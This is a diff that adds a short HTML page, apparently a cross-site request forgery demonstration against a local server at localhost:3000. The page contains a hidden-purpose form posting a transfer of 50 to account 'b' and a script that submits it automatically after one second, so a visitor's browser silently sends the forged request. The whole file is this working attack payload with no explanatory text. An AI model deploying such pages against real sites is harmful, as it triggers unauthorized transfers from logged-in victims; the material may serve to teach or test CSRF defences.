@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Document</title>
+</head>
+
+<body>
+    <form id="transferForm" method="post" action="http://localhost:3000/api/transfer">
+        <input type="text" name="target" value="b" />
+        <input type="text" name="amount" value="50" />
+        <input type="submit">
+    </form>
+    <script>
+        setTimeout(function () {
+            document.getElementById('transferForm').submit();
+        }, 1000);
+    </script>
+</body>
+
+</html>
